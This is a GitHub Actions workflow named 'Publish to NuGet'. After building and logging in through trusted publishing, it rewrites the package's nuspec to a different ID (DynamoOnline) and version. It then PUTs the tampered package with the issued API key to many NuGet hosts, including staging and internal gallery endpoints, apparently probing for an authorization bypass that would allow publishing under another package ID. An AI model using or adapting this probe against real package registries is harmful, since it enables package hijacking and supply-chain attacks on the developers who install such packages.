name: Publish to NuGet

on:
  push:
    tags: ['v*']

permissions:
  id-token: write
  contents: read

jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    
    steps:
      - uses: actions/checkout@v4
      
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'
      
      - name: Build and Pack
        run: |
          dotnet build -c Release
          dotnet pack -c Release -o ./artifacts --no-build

      - name: NuGet Login
        uses: NuGet/login@v1
        id: login
        with:
          user: ${{ secrets.NUGET_USER }}
      
      - name: Test different subdomains
        run: |
          cd artifacts
          ORIG_PKG=$(ls *.nupkg)
          
          # Create DynamoOnline package (you own this)
          rm -rf tampered && mkdir tampered
          unzip -q -o "$ORIG_PKG" -d tampered
          find tampered -name "*.nuspec" -exec sed -i "s|<id>DynamoTest456</id>|<id>DynamoOnline</id>|g" {} \;
          find tampered -name "*.nuspec" -exec sed -i "s|<version>1.0.0</version>|<version>77.0.0</version>|g" {} \;
          cd tampered && zip -q -r ../test.nupkg . && cd ..
          
          # Test each subdomain
          ENDPOINTS=(
            "https://api.nuget.org/v3/package/"
            "https://api-secondary.nuget.org/v3/package/"
            "https://api.nuget.org/api/v2/package/"
            "https://staging.nuget.org/api/v2/package/"
            "https://preview.nuget.org/api/v2/package/"
            "https://apippe.nuget.org/api/v2/package/"
            "https://gallery.nuget.org/api/v2/package/"
            "https://gallery-usnc.nuget.org/api/v2/package/"
            "https://gallery-ussc.nuget.org/api/v2/package/"
            "https://feed.nuget.org/api/v2/package/"
            "https://packages.nuget.org/api/v2/package/"
            "https://symbols.nuget.org/api/v2/package/"
            "https://globalcdn.nuget.org/api/v2/package/"
          )
          
          for endpoint in "${ENDPOINTS[@]}"; do
            echo "=== Testing: $endpoint ==="
            curl -s -w "\nHTTP:%{http_code}\n" -X PUT "$endpoint" \
              -H "X-NuGet-ApiKey: $NUGET_KEY" \
              -H "X-NuGet-Client-Version: 6.0.0" \
              -H "X-NuGet-Protocol-Version: 4.1.0" \
              -H "Content-Type: application/octet-stream" \
              --data-binary @test.nupkg --max-time 10 2>/dev/null || echo "TIMEOUT/ERROR"
            echo ""
          done
          
          echo "=== Testing staging/internal endpoints ==="
          
          # Staging slots
          for host in "stagingslot.nuget.org" "stagingslotussc.nuget.org"; do
            echo "--- $host ---"
            curl -s -w "\nHTTP:%{http_code}\n" -X PUT "https://$host/api/v2/package/" \
              -H "X-NuGet-ApiKey: $NUGET_KEY" \
              -H "X-NuGet-Client-Version: 6.0.0" \
              -H "X-NuGet-Protocol-Version: 4.1.0" \
              -H "Content-Type: application/octet-stream" \
              --data-binary @test.nupkg --max-time 10 2>/dev/null || echo "TIMEOUT/ERROR"
          done
          
          echo -e "\n=== Testing gallery ASE endpoints ==="
          for host in "gallery-usnc-ase.nuget.org" "gallery-ussc-ase.nuget.org" "gallery-usnc-ase-staging.nuget.org" "gallery-ussc-ase-staging.nuget.org"; do
            echo "--- $host ---"
            curl -s -w "\nHTTP:%{http_code}\n" -X PUT "https://$host/api/v2/package/" \
              -H "X-NuGet-ApiKey: $NUGET_KEY" \
              -H "X-NuGet-Client-Version: 6.0.0" \
              -H "X-NuGet-Protocol-Version: 4.1.0" \
              -H "Content-Type: application/octet-stream" \
              --data-binary @test.nupkg --max-time 10 2>/dev/null || echo "TIMEOUT/ERROR"
          done

        env:
          NUGET_KEY: ${{ steps.login.outputs.NUGET_API_KEY }}
